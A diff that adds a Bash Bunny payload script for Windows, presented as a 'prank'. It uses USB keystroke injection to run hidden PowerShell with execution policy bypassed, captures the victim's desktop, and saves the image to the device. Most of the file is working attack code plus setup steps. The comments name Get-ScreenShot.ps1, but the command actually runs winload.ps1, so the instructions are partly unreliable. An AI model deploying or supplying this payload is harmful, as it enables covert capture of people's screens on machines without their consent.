@@ -1,0 +1,54 @@
+#
+# Title: AutoScreenshot Windows
+# Author: Nick Rau
+# Credits to: guitarrapc for the Get-Screenshot.ps1
+# Category: Prank
+# Target: Windows
+# Attackmodes: Hid, Storage
+# Description:	This payload does uses powershell to take a screenshot of what's displayed on your desktop and
+#		saves it to the Bash Bunny. It makes use of a pre-made powershell script made by guitarrapc so
+#		credits for the Get-ScreenShot.ps1 go to him. I altered the script a bit to get around the problem
+#		with the 1920x1080 resolution. If you have part of your screen saved than you can fill in the resolution
+#		in the ... variables. EXAMPLE: 1920, 1080 or "null" if you do not want to use it.
+
+###### DISCLAMER #######
+# Do not use the keyboard when this payload runs.
+# The bunny comes up on screen when it is plugged in but it automaticly puts it
+# on the background using Ducky Script.
+
+###### OPTIONS ######
+# The options have to be set in the powershell file Get-ScreenShot.ps1.
+# The variable is called $fillres and is on top of the script.
+#
+# Fill it in like this: 				$fillres = 1920, 1080
+# Or if you do not want to fill in the resolution:	$fillres = "null"
+
+###### CONFIGURATION ######
+# 1. Put Get-ScreenShot.ps1 in the root folder of the Bash Bunny.
+# 2. Set variable "$fillres" to resolution of your choice example:1920, 1080 or "null"
+# 3. Eject Bash Bunny, set to switch you chose and plug it in.
+# 4. When the second stage begins "LED SPECIAL" it is waiting for you to set everything ready
+#    to be shot. This will be a blue blinking light When ready leave the Bash Bunny plugged in
+#    and flip switch to a different position.
+# 5. Bash Bunny takes screenshot and saves it!
+
+# SETUP - STAGE 1
+LED SETUP
+ATTACKMODE HID STORAGE
+GET SWITCH_POSITION
+PRIMARYSTH=$SWITCH_POSITION
+
+# ATTACK - STAGE 2
+LED SPECIAL
+GET SWITCH_POSITION
+TEST=$SWITCH_POSITION
+while true
+do GET SWITCH_POSITION
+if [ $SWITCH_POSITION != $TEST ]; then break; fi
+sleep 1
+done
+
+# EXECUTION - STAGE 3
+LED STAGE2
+RUN WIN powershell -WindowStyle Hidden -ExecutionPolicy bypass ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$PRIMARYSTH\winload.ps1')"
+LED FINISH
